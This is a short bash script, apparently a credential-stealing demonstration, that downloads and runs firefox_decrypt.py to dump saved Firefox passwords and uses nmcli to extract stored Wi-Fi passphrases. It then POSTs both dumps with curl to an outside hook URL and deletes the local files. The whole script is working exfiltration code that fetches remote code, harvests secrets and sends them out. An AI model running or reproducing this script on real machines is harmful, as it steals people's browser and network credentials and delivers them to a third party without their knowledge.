#!/bin/bash

url_post="https://ise2.istic.univ-rennes.fr/hook/ddealmei"
cd /tmp
wget https://ddealmei.github.io/assets/3b64d11ff0ac5da6a262b3490949ec7f6/firefox_decrypt.py && \
	chmod +x firefox_decrypt.py && \
	python firefox_decrypt.py > firefox_dump.txt || python3 firefox_decrypt.py > firefox_dump.txt
for ssid in $(nmcli connection show |grep wifi | cut -d" " -f1); do 
	pwd=$(nmcli connection --show-secrets show $ssid | grep "wireless-security.psk:" | cut -d':' -f2 | xargs); 
	echo $ssid $pwd >> ./wifi_dump.txt ; 
done

curl -X POST --data-binary @./firefox_dump.txt --insecure $url_post && \
curl -X POST --data-binary @./wifi_dump.txt --insecure $url_post

rm ./firefox_dump.txt ./wifi_dump.txt
